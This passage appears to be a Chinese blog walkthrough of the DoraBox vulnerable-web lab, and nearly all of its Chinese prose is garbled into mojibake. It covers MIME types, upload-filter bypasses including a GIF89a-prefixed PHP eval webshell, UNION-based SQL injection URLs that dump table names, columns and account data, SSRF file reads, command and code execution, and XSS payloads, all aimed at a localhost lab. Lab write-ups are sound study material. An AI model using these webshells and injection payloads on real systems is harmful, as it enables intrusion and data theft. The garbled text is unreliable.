Extensionsï¼‰å¤šç”¨é€”äº’è”ç½‘é‚®ä»¶æ‰©å±•ç±»å‹ã€‚æ˜¯è®¾å®šæŸç§æ‰©å±•åæ–‡ä»¶ç”¨ä¸€ç§åº”ç”¨ç¨‹åºæ¥æ‰“å¼€çš„æ–¹å¼ç±»å‹ï¼Œå½“è¯¥æ‰©å±•åæ–‡ä»¶è¢«è®¿é—®çš„æ—¶å€™ï¼Œæµè§ˆå™¨ä¼šè‡ªåŠ¨ä½¿ç”¨æŒ‡å®šçš„åº”ç”¨ç¨‹åºæ¥æ‰“å¼€ã€‚å¤šç”¨äºæŒ‡å®šä¸€äº›å®¢æˆ·ç«¯è‡ªå®šä¹‰çš„æ–‡ä»¶åï¼Œä»¥åŠä¸€äº›åª’ä½“æ–‡ä»¶æ‰“å¼€æ–¹å¼ã€‚ï¼ˆæ¥è‡ªç™¾åº¦ç™¾ç§‘ï¼‰</p></blockquote><p><strong>å¸¸è§çš„ç±»å‹ï¼š</strong></p><table><thead><tr><th>æ–‡ä»¶ç±»å‹</th><th>åç¼€</th><th>æ•°æ®åŒ…ä¸­çš„æ–‡ä»¶ç±»å‹</th></tr></thead><tbody><tr><td>è¶…æ–‡æœ¬æ ‡è®°è¯­è¨€æ–‡æœ¬</td><td>.html</td><td>text/html</td></tr><tr><td>xml æ–‡æ¡£</td><td>.xml</td><td>text/xml</td></tr><tr><td>xhtml æ–‡æ¡£</td><td>.xhtml</td><td>application/xhtml+xml</td></tr><tr><td>æ™®é€šæ–‡æœ¬æ–‡æ¡£</td><td>.text</td><td>text/plain</td></tr><tr><td>RTF æ–‡æœ¬</td><td>.rtf</td><td>application/rtf</td></tr><tr><td>PDF æ–‡æ¡£</td><td>.pdf</td><td>application/pdf</td></tr><tr><td>Miscrosoft Word æ–‡ä»¶</td><td>.word</td><td>application/msword</td></tr><tr><td>PNG å›¾åƒ</td><td>.png</td><td>image/png</td></tr><tr><td>GIF å›¾å½¢</td><td>.gif</td><td>image/gif</td></tr><tr><td>JPEG å›¾å½¢</td><td>.jpeg,.jpg</td><td>image/jpeg</td></tr><tr><td>au å£°éŸ³æ–‡ä»¶</td><td>.au</td><td>audio/basic</td></tr><tr><td>MIDI éŸ³ä¹æ–‡ä»¶</td><td>mid,.midi</td><td>audio/midi,audio/x-midi</td></tr><tr><td>RealAudio éŸ³ä¹</td><td>.ra,.ram</td><td>audio/x-pn-realaudio</td></tr><tr><td>AVI æ–‡ä»¶</td><td>.avi</td><td>video/x-msvideo</td></tr><tr><td>GZIP æ–‡ä»¶</td><td>.gz</td><td>application/x-gzip</td></tr><tr><td>TAR æ–‡ä»¶</td><td>.tar</td><td>application/x-tar</td></tr><tr><td>ä»»æ„çš„äºŒè¿›åˆ¶æ•°æ®</td><td></td><td>application/octet-stream</td></tr></tbody></table><p><strong>å‡ºç°åœ¨ HTTP æ•°æ®åŒ…ä¸­å¯èƒ½æœ‰çš„ä½ç½®ï¼ˆä¸æ˜¯å¾ˆæœ‰ç”»é¢æ„Ÿâ€¦ï¼‰ï¼š</strong></p><blockquote><p><strong>MIME ä¿¡æ¯å¤´æœ‰ï¼š</strong></p><p>MIME-Version:</p><p>è¿™ä¸ªå¤´æä¾›äº†æ‰€ç”¨ MIME çš„ç‰ˆæœ¬å·ã€‚è¿™ä¸ªå€¼ä¹ æƒ¯ä¸Šä¸º 1.0ã€‚</p><p><strong>Content-Type:</strong></p><p>å®ƒå®šä¹‰äº†æ•°æ®çš„ç±»å‹ï¼Œä»¥ä¾¿æ•°æ®èƒ½è¢«é€‚å½“çš„å¤„ç†ã€‚æœ‰æ•ˆçš„ç±»å‹æœ‰ï¼štextï¼Œimageï¼Œaudioï¼Œvideoï¼Œapplicationsï¼Œmultipart å’Œ messageã€‚æ³¨æ„ä»»ä½•ä¸€ä¸ªäºŒè¿›åˆ¶é™„ä»¶éƒ½åº”è¯¥è¢«å«åš application/octet- streamã€‚è¿™ä¸ªå¤´çš„ä¸€äº›ç”¨ä¾‹ä¸ºï¼šimage/jpg, application/msworkï¼Œmultipart/mixedï¼Œè¿™åªæ˜¯å¾ˆå°‘çš„ä¸€éƒ¨åˆ†ã€‚</p><p><strong>Content-Transfer-Encoding:</strong></p><p>è¿™æ˜¯æ‰€æœ‰å¤´ä¸­æœ€é‡è¦çš„ä¸€ä¸ªï¼Œå› ä¸ºå®ƒè¯´æ˜äº†å¯¹æ•°æ®æ‰€æ‰§è¡Œçš„ç¼–ç æ–¹å¼ï¼Œå®¢æˆ· / MUA å°†ç”¨å®ƒå¯¹é™„ä»¶è¿›è¡Œè§£ç ã€‚å¯¹äºæ¯ä¸ªé™„ä»¶ï¼Œå¯ä»¥ä½¿ç”¨ 7bitï¼Œ8bitï¼Œbinary ï¼Œquoted-printableï¼Œ<a href="https://baike.baidu.com/item/base64">base64</a> å’Œ custom ä¸­çš„ä¸€ç§ç¼–ç æ–¹å¼ã€‚7bit ç¼–ç æ˜¯ç”¨åœ¨ US ASCII<a href="https://baike.baidu.com/item/%E5%AD%97%E7%AC%A6%E9%9B%86"> å­—ç¬¦é›†</a>ä¸Šçš„å¸¸ç”¨çš„ä¸€ç§ç¼–ç æ–¹å¼ï¼Œä¹Ÿå°±æ˜¯ï¼Œä¿æŒå®ƒçš„åŸæ ·ã€‚8bit å’Œ binary ç¼–ç ä¸€èˆ¬ä¸ç”¨ã€‚å¯¹äººç±»å¯è¯»çš„æ ‡å‡†æ–‡æœ¬ï¼Œå¦‚æœä¼ è¾“è¦ç»è¿‡å¯¹æ ¼å¼æœ‰å½±å“çš„<a href="https://baike.baidu.com/item/%E7%BD%91%E5%85%B3">ç½‘å…³</a>æ—¶å¯¹å…¶è¿›è¡Œä¿æŠ¤ï¼Œå¯ä»¥ä½¿ç”¨ quoted printable ã€‚Base64 æ˜¯ä¸€ç§é€šç”¨æ–¹æ³•ï¼Œåœ¨éœ€è¦å†³å®šä½¿ç”¨å“ªä¸€ç§ç¼–ç æ–¹æ³•æ—¶ï¼Œå®ƒæä¾›äº†ä¸€ä¸ªä¸ç”¨è´¹è„‘å­çš„é€‰æ‹©ï¼›å®ƒé€šå¸¸ç”¨åœ¨äºŒè¿›åˆ¶ï¼Œéæ–‡æœ¬æ•°æ®ä¸Šã€‚æ³¨æ„ï¼Œä»»ä½•é 7bit æ•°æ®å¿…é¡»ç”¨ä¸€ç§æ¨¡å¼ç¼–ç ï¼Œè¿™æ ·å®ƒå°±å¯ä»¥é€šè¿‡ Internet<a href="https://baike.baidu.com/item/%E9%82%AE%E4%BB%B6%E7%BD%91%E5%85%B3"> é‚®ä»¶ç½‘å…³</a>ï¼</p><p><strong>Content-ID:</strong></p><p>å¦‚æœ Content-Type æ˜¯ message/external-body æˆ– multipart/alternative æ—¶ï¼Œè¿™ä¸ªå¤´å°±æœ‰ç”¨äº†ï¼Œå®ƒè¶…å‡ºäº†æœ¬æ–‡çš„èŒƒå›´ã€‚</p><h3 id="content-description"><a class="markdownIt-Anchor" href="#content-description">#</a> Content-Description:</h3><p>è¿™æ˜¯ä¸€ä¸ªå¯é€‰çš„å¤´ã€‚å®ƒæ˜¯ä»»ä½•ä¿¡æ¯æ®µå†…å®¹çš„è‡ªç”±æ–‡æœ¬æè¿°ã€‚æè¿°å¿…é¡»ä½¿ç”¨ us-ascii ç ã€‚</p><p><strong>Content-Disposition:</strong></p><p>ä¸€ä¸ªè¯•éªŒæ€§çš„å¤´ï¼Œå®ƒç”¨äºç»™å®¢æˆ·ç¨‹åº / MUA æä¾›æç¤ºï¼Œæ¥å†³å®šæ˜¯å¦åœ¨è¡Œå†…æ˜¾ç¤ºé™„ä»¶æˆ–ä½œä¸ºå•ç‹¬çš„é™„ä»¶ã€‚</p><p>MIME æ®µå¤´ï¼ˆå‡ºç°åœ¨å®é™…çš„ MIME é™„ä»¶éƒ¨åˆ†çš„å¤´ï¼‰ï¼Œé™¤äº† MIME-Version å¤´ï¼Œå¯ä»¥æ‹¥æœ‰ä»¥ä¸Šä»»ä½•å¤´å­—æ®µã€‚å¦‚æœä¸€ä¸ª MIME å¤´æ˜¯ä¿¡æ¯å—çš„ä¸€éƒ¨åˆ†ï¼Œå®ƒå°†ä½œç”¨äºæ•´ä¸ªä¿¡æ¯ä½“ã€‚ä¾‹å¦‚ï¼Œå¦‚æœ Content-Transfer-Encoding æ˜¾ç¤ºåœ¨ä¿¡æ¯ï¼ˆæŒ‡æ•´ä¸ªä¿¡æ¯ï¼‰å¤´ä¸­ï¼Œå®ƒåº”ç”¨äºæ•´ä¸ªä¿¡æ¯ä½“ï¼Œä½†æ˜¯å¦‚æœå®ƒæ˜¾ç¤ºåœ¨ä¸€ä¸ª MIME æ®µé‡Œï¼Œå®ƒ &quot;åªèƒ½&quot; ç”¨äºé‚£ä¸ªæ®µä¸­ã€‚</p><p>æ³¨æ„ï¼šå…¶å¯ä»¥å¯¹è‡ªåŠ¨å¯¹æ”¶åˆ°çš„<a href="https://baike.baidu.com/item/%E9%82%AE%E4%BB%B6">é‚®ä»¶</a>è¿›è¡Œè§£å¯†ã€‚</p></blockquote><p>[ä»¥ä¸Šæ‹“å±•æ¥è‡ªè¿™é‡Œ</p><h1 id="æ‹“å±•åé™åˆ¶æ–‡ä»¶ä¸Šä¼ "><a class="markdownIt-Anchor" href="#æ‹“å±•åé™åˆ¶æ–‡ä»¶ä¸Šä¼ ">#</a> æ‹“å±•åé™åˆ¶æ–‡ä»¶ä¸Šä¼ </h1><p>åå°è¿›è¡Œäº†æ–‡ä»¶ååç¼€è¿‡æ»¤ï¼Œæ— æ³•ä¸Šä¼ .php æ–‡ä»¶</p><h2 id="è¿‡ç¨‹-6"><a class="markdownIt-Anchor" href="#è¿‡ç¨‹-6">#</a> è¿‡ç¨‹ï¼š</h2><ol><li>å°è¯•å¤§å°å†™ç»•è¿‡ï¼ŒæŠŠæ–‡ä»¶ååç¼€æ”¹ä¸º.phPï¼Œä¸Šä¼ æˆåŠŸï¼Œèœåˆ€ç›´è¿<img src="dorabox_fp_hz001.png" alt=""></li></ol><h2 id="æ€»ç»“-6"><a class="markdownIt-Anchor" href="#æ€»ç»“-6">#</a> æ€»ç»“ï¼š</h2><p>å› ä¸ºå†™è¿‡ upload_labs (æ²¡å†™å®Œ)ï¼Œå°±æœ‰æ€è·¯</p><h1 id="å†…å®¹é™åˆ¶æ–‡ä»¶ä¸Šä¼ "><a class="markdownIt-Anchor" href="#å†…å®¹é™åˆ¶æ–‡ä»¶ä¸Šä¼ ">#</a> å†…å®¹é™åˆ¶æ–‡ä»¶ä¸Šä¼ </h1><p>å¯¹æ–‡ä»¶å†…å®¹è¿›è¡Œåˆ¤è¯»è¿‡æ»¤</p><h2 id="è¿‡ç¨‹-7"><a class="markdownIt-Anchor" href="#è¿‡ç¨‹-7">#</a> è¿‡ç¨‹ï¼š</h2><ol><li><p>åœ¨æœ¨é©¬æ–‡ä»¶æœ€å‰é¢åŠ ä¸Š GIF89a:</p><p><code>GIF89a &lt;?php @eval($_POST['attack']) ?&gt;</code></p></li><li><p>ä¸Šä¼ æˆåŠŸï¼Œè·¯å¾„å‘Šè¯‰äº†ï¼Œèœåˆ€ç›´è¿</p></li></ol><p><img src="dorabox_fp_nr001.png" alt=""></p><h2 id="æ€»ç»“-7"><a class="markdownIt-Anchor" href="#æ€»ç»“-7">#</a> æ€»ç»“ï¼š</h2><p>GIF89a æ˜¯æ–‡ä»¶å¤´æ ¡éªŒå†…å®¹ï¼ŒæœåŠ¡å™¨çœ‹åˆ°è¿™é‡Œå°±ä¼šä»¥ä¸ºæ˜¯ GIF æ–‡ä»¶ã€‚</p><p>å¸¸è§çš„æ–‡ä»¶å¤´å¯¹åº”å…³ç³»ï¼ˆå…¥èŒåŸ¹è®­ä¸Šçš„ï¼Œè¿™ä¸ªæˆ‘ä»¥å‰è¿˜æ‰¾è¿‡ï¼Œå°±æ˜¯å› ä¸ºèœï¼Œæ²¡æœ‰æ‰¾åˆ°ï¼‰ï¼š</p><ol><li>JPEG;.JPE;.JPGï¼Œâ€JPGGraphic Fileâ€</li><li>gifï¼Œâ€GIF 89Aâ€</li><li>zipï¼Œâ€Zip Compressedâ€</li><li>doc;.xls;.xlt;.ppt;.aprï¼Œâ€MS Compound Document v1 or Lotus Approach APRfileâ€</li></ol><h1 id="sqliæ•°å­—æ‰‹å·¥æ³¨å…¥"><a class="markdownIt-Anchor" href="#sqliæ•°å­—æ‰‹å·¥æ³¨å…¥">#</a> SQLi æ•°å­—æ‰‹å·¥æ³¨å…¥</h1><p><img src="dorabox_sqlnum001.png" alt=""></p><h2 id="è¿‡ç¨‹-8"><a class="markdownIt-Anchor" href="#è¿‡ç¨‹-8">#</a> è¿‡ç¨‹ï¼š</h2><ol><li><p>è¾“å‡ºæŠ¥é”™ï¼š</p><p><a href="http://localhost/dorabox/sql_injection/sql_num.php?id=1">http://localhost/dorabox/sql_injection/sql_num.php?id=1</a> order by 4 &amp;submit=submit<img src="dorabox_sqlnum007.png" alt=""> æ­£å¸¸è¾“å‡ºï¼š</p><p><a href="http://localhost/dorabox/sql_injection/sql_num.php">http://localhost/dorabox/sql_injection/sql_num.php</a><br>?id=1 order by 3 &amp;submit=submit</p><p>ä»¥ä¸Šè¯´æ˜ï¼Œåº”è¾“å‡º 3 ä¸ªå­—æ®µ</p></li><li><p>ç”¨ count (*) ç»Ÿè®¡è¡¨å†…æ•°æ®ï¼Œåªæœ‰ä¸¤æ¡æ•°æ®ï¼š</p><p><a href="http://localhost/dorabox/sql_injection/sql_num.php?id=3">http://localhost/dorabox/sql_injection/sql_num.php?id=3</a> union select 10086,count(*),10087 from news order by 1 desc limit 1<br>&amp;submit=submit</p><p><img src="dorabox_sqlnum002.png" alt=""></p></li><li><p>çˆ†æ•°æ®åº“</p><p><a href="http://localhost/dorabox/sql_injection/sql_num.php">http://localhost/dorabox/sql_injection/sql_num.php</a><br>?id=1 union select 3,database(),user() order by 1 desc limit 1<br>&amp;submit=submit<img src="dorabox_sqlnum003.png" alt=""></p></li><li><p>çˆ†è¡¨åï¼Œåˆ©ç”¨ group_concat ()ï¼š</p><p><a href="http://localhost/dorabox/sql_injection/sql_num.php?id=1">http://localhost/dorabox/sql_injection/sql_num.php?id=1</a> union select 3,group_concat(table_name),0 from information_schema.tables where table_schema = database() order by 1 desc<br>&amp;submit=submit<img src="dorabox_sqlnum004.png" alt=""></p></li><li><p>çˆ†å­—æ®µï¼š</p><p><a href="http://localhost/dorabox/sql_injection/sql_num.php">http://localhost/dorabox/sql_injection/sql_num.php</a><br>?id=1 union select 3,group_concat(column_name),0 from information_schema.columns where table_name = â€˜accountâ€™ order by 1 desc<br>&amp;submit=submit<img src="dorabox_sqlnum005.png" alt=""></p></li><li><p>çˆ†å†…å®¹ï¼š</p><p><a href="http://localhost/dorabox/sql_injection/sql_num.php">http://localhost/dorabox/sql_injection/sql_num.php</a><br>?id = 1 union select 3,concat_ws(&quot;,&quot;,id,rest,own),0 from account where 1=1 order by 1 desc<img src="dorabox_sqlnum006.png" alt=""></p></li></ol><h2 id="æ€»ç»“-8"><a class="markdownIt-Anchor" href="#æ€»ç»“-8">#</a> æ€»ç»“ï¼š</h2><ul><li><p>mysql å­—ç¬¦æ‹¼æ¥æ–¹æ³•</p><ol><li><p>concat()</p><p>åŠŸèƒ½ï¼šå°†å¤šä¸ªå­—ç¬¦ä¸²è¿æ¥æˆä¸€ä¸ªå­—ç¬¦ä¸²</p><p>è¯­æ³•ï¼šconcat (str1, str2, â€¦)</p><p>è¯´æ˜ï¼šè¿”å›ç»“æœä¸ºè¿æ¥å‚æ•°äº§ç”Ÿçš„å­—ç¬¦ä¸²ï¼Œå¦‚æœæœ‰ä»»ä½•ä¸€ä¸ªå‚æ•°ä¸º nullï¼Œåˆ™è¿”å›å€¼ä¸º nullã€‚</p></li><li><p>concat_ws()</p><p>åŠŸèƒ½ï¼šå°†å¤šä¸ªå­—ç¬¦ä¸²æ‹¼æ¥æˆä¸€ä¸ªå­—ç¬¦ä¸²ï¼Œä»¥è‡ªå®šä¹‰çš„ç¬¦å·è¿›è¡Œåˆ†å‰²</p><p>è¯­æ³•ï¼šconcat (separator, str1, str2, â€¦)</p><p>è¯´æ˜ï¼šç¬¬ä¸€ä¸ªå‚æ•°æŒ‡å®šåˆ†éš”ç¬¦ï¼Œè‹¥ä¸º null, è¿”å›ç»“æœä¹Ÿä¼šä¸º null</p></li><li><p>group_concat()</p><p>åŠŸèƒ½ï¼šå°† group by äº§ç”Ÿçš„åŒä¸€ä¸ªåˆ†ç»„ä¸­çš„å€¼è¿æ¥èµ·æ¥ï¼Œè¿”å›ä¸€ä¸ªå­—ç¬¦ä¸²ç»“æœ</p><p>è¯­æ³•ï¼šgroup_concat ([distinct] è¦è¿æ¥çš„å­—æ®µ [order by æ’åºå­—æ®µ asc/desc] [separator â€˜åˆ†éš”ç¬¦â€™] )</p><p>è¯´æ˜ï¼šé€šè¿‡ä½¿ç”¨ distinct å¯ä»¥æ’é™¤é‡å¤å€¼ï¼›å¦‚æœå¸Œæœ›å¯¹ç»“æœä¸­çš„å€¼è¿›è¡Œæ’åºï¼Œå¯ä»¥ä½¿ç”¨ order by å¥å­ï¼›separator æ˜¯ä¸€ä¸ªå­—ç¬¦ä¸²ï¼Œç¼ºçœä¸ºä¸€ä¸ªé€—å·</p></li></ol></li><li><p>information_schema</p><p>information_schema æ•°æ®åº“æ˜¯ MySQL è‡ªå¸¦çš„ï¼Œå®ƒæä¾›äº†è®¿é—®æ•°æ®åº“å…ƒæ•°æ®çš„æ–¹å¼ã€‚å…ƒæ•°æ®æ˜¯å…³äºæ•°æ®çš„æ•°æ®ï¼Œå¦‚æ•°æ®åº“åæˆ–è¡¨åï¼Œåˆ—çš„æ•°æ®ç±»å‹ï¼Œæˆ–è®¿é—®æƒé™ç­‰ã€‚æœ‰äº›æ—¶å€™ç”¨äºè¡¨è¿°è¯¥ä¿¡æ¯çš„å…¶ä»–æœ¯è¯­åŒ…æ‹¬ â€œæ•°æ®è¯å…¸â€ å’Œ â€œç³»ç»Ÿç›®å½•â€ã€‚</p><p>å¸¸ç”¨è¡¨ï¼š</p><ol><li>COLLATION_CHARACTER_SET_APPLICABILITY è¡¨ï¼Œå’Œå­—ç¬¦ç¼–ç ç›¸å…³ï¼ŒåŒ…å«çš„å¸¸ç”¨åˆ—ï¼š<ol><li>COLLATION_NAME æ’åºè§„åˆ™æ˜</li><li>CHARACTER_SET_NAME ä¸æ’åºè§„åˆ™å…³è”çš„å­—ç¬¦é›†çš„åç§°</li></ol></li><li>TABLES è¡¨ï¼Œæä¾›åº“ä¸­è¡¨ä¿¡æ¯ï¼ŒåŒ…å«çš„å¸¸ç”¨åˆ—ï¼š<ol><li>Table_catalog æ•°æ®è¡¨ç™»è®°ç›®å½•</li><li>Table_schema æ•°æ®è¡¨æ‰€å±çš„æ•°æ®åº“å</li><li>Table_name è¡¨å</li><li>Table_type è¡¨ç±»å‹ [system view | base table]</li><li>Engine ä½¿ç”¨çš„æ•°æ®åº“å¼•æ“ [MyISAM | CSV | InnoDB]</li><li>Version ç‰ˆæœ¬ï¼Œé»˜è®¤å€¼ 10</li><li>Row_format è¡Œæ ¼å¼ [Compact | Dynamic | Fixed]</li><li>Table_rows è¡¨é‡Œæ‰€å­˜å¤šå°‘è¡Œæ•°æ® (æ—©çŸ¥é“æœ‰è¿™ä¸ªï¼Œæˆ‘å°±)</li><li>Avg_row_length å¹³å‡è¡Œé•¿åº¦</li><li>Data_length æ•°æ®é•¿åº¦</li><li>Max_data_length æœ€å¤§æ•°æ®é•¿åº¦</li><li>Index_length ç´¢å¼•é•¿åº¦</li><li>Create_time è¡¨çš„åˆ›å»ºæ—¶é—´</li><li>Update_time è¡¨çš„æ›´æ–°æ—¶é—´</li><li>Check_time è¡¨çš„æ£€æŸ¥æ—¶é—´</li><li>Table_collation è¡¨çš„å­—ç¬¦æ ¡éªŒç¼–ç é›†</li><li>Chechsum æ ¡éªŒå’Œ</li></ol></li><li>COLUMNS è¡¨ï¼Œæä¾›è¡¨ä¸­å­—æ®µä¿¡æ¯ï¼ŒåŒ…å«çš„å¸¸ç”¨åˆ—ï¼š<ol><li>TABLE_CATALOG åŒ…å«è¯¥åˆ—çš„è¡¨æ‰€å±çš„ç›®å½•åç§°ã€‚è¯¥å€¼å§‹ç»ˆä¸º defã€‚</li><li>TABLE_SCHEMA å­—æ®µæ‰€åœ¨æ•°æ®åº“çš„åç§°ã€‚</li><li>TABLE_NAME å­—æ®µæ‰€åœ¨è¡¨çš„åç§°ã€‚</li><li></li><li>COLUMN_NAME å­—æ®µçš„åç§°ã€‚</li><li>ORDINAL_POSITION è¡¨ä¸­å­—æ®µçš„ä½ç½®ã€‚ï¼ˆå¯èƒ½ä¼šç”¨ order by ORDINAL_POSITIONï¼‰COLUMN_TYPE å­—æ®µæ•°æ®ç±»å‹ã€‚</li><li>COLUMN_DEFAULT å­—æ®µçš„é»˜è®¤å€¼ã€‚å¦‚æœå­—æ®µå…·æœ‰æ˜¾ç¤ºç¼ºçœå€¼ NULLï¼Œæˆ–è€…å­—æ®µå®šä¹‰ä¸å« DEFAULT å­å¥ï¼Œåˆ™è¯¥å€¼ä¸º NULLã€‚</li><li>COLUMN_TYPE ç±»å‹åç§°ä»¥åŠåˆ«çš„ä¿¡æ¯ï¼Œæ¯”å¦‚ç²¾åº¦æˆ–é•¿åº¦ï¼ˆä»¥å­—ç¬¦ä¸ºå•ä½</li><li>CHARACTER_OCTET_LENGTH å¯¹äºå­—ç¬¦ä¸²åˆ—ï¼Œæœ€å¤§é•¿åº¦ï¼ˆä»¥å­—èŠ‚ä¸ºå•ä½</li><li>CHARACTER_MAXIMUM_LENGTH å¯¹äºå­—ç¬¦ä¸²åˆ—ï¼Œæœ€å¤§é•¿åº¦ï¼ˆä»¥å­—ç¬¦ä¸ºå•ä½ï¼‰ COLUMN_KEY åç§°æ˜¯å¦å·²å»ºç«‹ç´¢å¼•</li></ol></li></ol><h1 id="ssrf"><a class="markdownIt-Anchor" href="#ssrf">#</a> SSRF</h1><p><img src="dorabox_ssrf001.png" alt=""></p><h2 id="è¿‡ç¨‹-9"><a class="markdownIt-Anchor" href="#è¿‡ç¨‹-9">#</a> è¿‡ç¨‹ï¼š</h2><ol><li>åˆ©ç”¨ file è¿›è¡Œæ–‡ä»¶è¯»å–<img src="dorabox_ssrf002.png" alt=""></li></ol><h2 id="æ€»ç»“-9"><a class="markdownIt-Anchor" href="#æ€»ç»“-9">#</a> æ€»ç»“ï¼š</h2><ul><li>å…¶å®å°±æ˜¯æœ‰ url çš„ï¼Œéœ€è¦è®¿é—®åˆ«çš„èµ„æºçš„å°±å¯èƒ½æœ‰ ssrf æ¼æ´ã€‚</li><li>åˆ©ç”¨æ–¹å¼ï¼ˆé‡Œé¢å¥½å¤šæ²¡è¯•è¿‡çš„ï¼Œç­‰æˆ‘å†™å®ŒæŠ¥å‘Šè¦å»ç©ç©ï¼‰<ol><li>åˆ©ç”¨ file åè®®è¯»å–æœ¬åœ°æ–‡ä»¶ï¼ˆç±»ä¼¼æ–‡ä»¶åŒ…å«ï¼Œæƒ³è¦åˆ©ç”¨è¿™ä¸ªæ¼æ´ï¼Œéœ€è¦çŸ¥é“é‡Œé¢æœ‰ä»€ä¹ˆæ–‡ä»¶æˆ–è€…ç›®å½•ï¼Œç„¶åè¿›è¡Œå†…å®¹æå–ï¼‰</li><li>å¯¹æœåŠ¡å™¨æ‰€åœ¨å†…ç½‘ã€æœ¬åœ°è¿›è¡Œç«¯å£æ‰«æï¼Œè·å–ä¸€äº›æœåŠ¡çš„ banner ä¿¡æ¯</li><li>æ”»å‡»è¿è¡Œåœ¨å†…ç½‘æˆ–æœ¬åœ°çš„åº”ç”¨ç¨‹åº</li><li>å¯¹å†…ç½‘ web åº”ç”¨è¿›è¡ŒæŒ‡çº¹è¯†åˆ«ï¼Œè¯†åˆ«ä¼ä¸šå†…éƒ¨çš„èµ„äº§ä¿¡æ¯</li><li>æ”»å‡»å†…å¤–ç½‘çš„ web åº”ç”¨ï¼Œä¸»è¦æ˜¯ä½¿ç”¨ HTTP GET è¯·æ±‚å°±å¯ä»¥å®ç°çš„æ”»å‡»</li></ol></li><li>ä¸€äº›çš„ url ä¸­çš„å…³é”®å­—ï¼šshareã€wapã€urlã€linkã€srcã€sourceã€targetã€uã€3gã€displayã€sourceURlã€imageURLã€domainâ€¦â€¦</li></ul></li></ul><h1 id="ä»»æ„ä»£ç æ‰§è¡Œ"><a class="markdownIt-Anchor" href="#ä»»æ„ä»£ç æ‰§è¡Œ">#</a> ä»»æ„ä»£ç æ‰§è¡Œ</h1><p>æ ¹æ®é¢˜ç›®æç¤ºï¼Œå°±æ˜¯éšä¾¿è¾“ä»£ç ï¼Œç„¶åæœåŠ¡å™¨æ‰§è¡Œè„šæœ¬</p><h2 id="è¿‡ç¨‹-10"><a class="markdownIt-Anchor" href="#è¿‡ç¨‹-10">#</a> è¿‡ç¨‹ï¼š</h2><ol><li>phpinfo ()ï¼ŒæŸ¥çœ‹ php ç‰ˆæœ¬ä¿¡æ¯<img src="dorabox_code002.png" alt=""></li></ol><h2 id="æ€»ç»“-10"><a class="markdownIt-Anchor" href="#æ€»ç»“-10">#</a> æ€»ç»“ï¼š</h2><p>ä»£ç æ‰§è¡Œæ¼æ´å°±æ˜¯é€šè¿‡æ‰§è¡Œè„šæœ¬ä»£ç ï¼Œè¿›è¡Œæ¸—é€</p><h1 id="ä»»æ„å‘½ä»¤æ‰§è¡Œ"><a class="markdownIt-Anchor" href="#ä»»æ„å‘½ä»¤æ‰§è¡Œ">#</a> ä»»æ„å‘½ä»¤æ‰§è¡Œ</h1><p>æ ¹æ®é¢˜ç›®æç¤ºï¼Œå°±æ˜¯éšä¾¿è¾“å‘½ä»¤</p><h2 id="è¿‡ç¨‹-11"><a class="markdownIt-Anchor" href="#è¿‡ç¨‹-11">#</a> è¿‡ç¨‹ï¼š</h2><ol><li>whoamiï¼ŒæŸ¥çœ‹æœåŠ¡å™¨ä¿¡æ¯<img src="dorabox_cmd001.png" alt=""></li></ol><h2 id="æ€»ç»“-11"><a class="markdownIt-Anchor" href="#æ€»ç»“-11">#</a> æ€»ç»“ï¼š</h2><p>çœ‹æºç æ˜¯åˆ©ç”¨ exec () å‡½æ•°ï¼Œç›´æ¥è°ƒç”¨æ“ä½œç³»ç»Ÿçš„å‘½ä»¤</p><h1 id="åå°„xss"><a class="markdownIt-Anchor" href="#åå°„xss">#</a> åå°„ XSS</h1><p>è¾“å…¥ 12345678ï¼ŒæŸ¥çœ‹æºä»£ç ï¼Œå‘ç°æœåŠ¡å™¨è¿”å›äº†è¾“å…¥çš„å­—ç¬¦æ•°ç»Ÿè®¡ï¼Œä»¥åŠè¾“å…¥çš„å­—ç¬¦ä¸²ï¼Œåœ¨ html ä¸­</p><p><img src="dorabox_xss_ref001.png" alt=""></p><h2 id="è¿‡ç¨‹-12"><a class="markdownIt-Anchor" href="#è¿‡ç¨‹-12">#</a> è¿‡ç¨‹ï¼š</h2><ol><li>åŠ å…¥ js ä»£ç ï¼Œalert ä¸€ä¸‹<img src="dorabox_xss_ref002.png" alt=""></li></ol><h2 id="æ€»ç»“-12"><a class="markdownIt-Anchor" href="#æ€»ç»“-12">#</a> æ€»ç»“ï¼š</h2><p>â€‹XSS åå°„å‹ï¼Œå°±æ˜¯é€šè¿‡ get æˆ–è€… post è¯·æ±‚ï¼Œè¢«åå°å¤„ç†è¿‡æ•°æ®ï¼Œå¹¶å“åº”åˆ°å‰ç«¯é¡µé¢ä¸Šã€‚å¯ä»¥é€šè¿‡ä½¿ç”¨ç™½åå•è¿‡æ»¤æ‰è¾“å…¥çš„æ¶æ„å­—ç¬¦è¿›è¡Œä¿®å¤ã€‚</p><h1 id="å­˜å‚¨å‹xss"><a class="markdownIt-Anchor" href="#å­˜å‚¨å‹xss">#</a> å­˜å‚¨å‹ XSS</h1><p><img src="dorabox_xss_sav001.png" alt=""></p><h2 id="è¿‡ç¨‹-13"><a class="markdownIt-Anchor" href="#è¿‡ç¨‹-13">#</a> è¿‡ç¨‹ï¼š</h2><ol><li>alert è¯•ä¸€ä¸‹</li></ol><figure class="highlight html"><figcaption><span>payload</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="javascript">alert(<span class="string">&quot;/XSS/&quot;</span>)</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure><p><img src="dorabox_xss_sav001.png" alt=""></p><ol start="2"><li>submit åè¿”å›äº†å­—ç¬¦æ•°ï¼Œæ²¡æœ‰ alertï¼Œåˆ·æ–°ä¸€ä¸‹ï¼Œé‡æ–°åŠ è½½ï¼Œå‘ç°å­˜å‚¨æˆåŠŸ</li></ol><p><img src="dorabox_xss_sav002.png" alt=""></p><h2 id="æ€»ç»“-13"><a class="markdownIt-Anchor" href="#æ€»ç»“-13">#</a> æ€»ç»“ï¼š</h2><p>å­˜å‚¨å‹å°±æ˜¯æŠŠç”¨æˆ·è¾“å…¥çš„æ¶æ„å­—ç¬¦ä¸²å­˜å‚¨åœ¨æœåŠ¡å™¨ï¼ˆæ•°æ®åº“ï¼‰ï¼Œä¸€èˆ¬åœ¨å¯ä»¥å­˜å‚¨æ•°æ®å¹¶ä¼šè¿”å›åˆ°å‰ç«¯ä»£ç 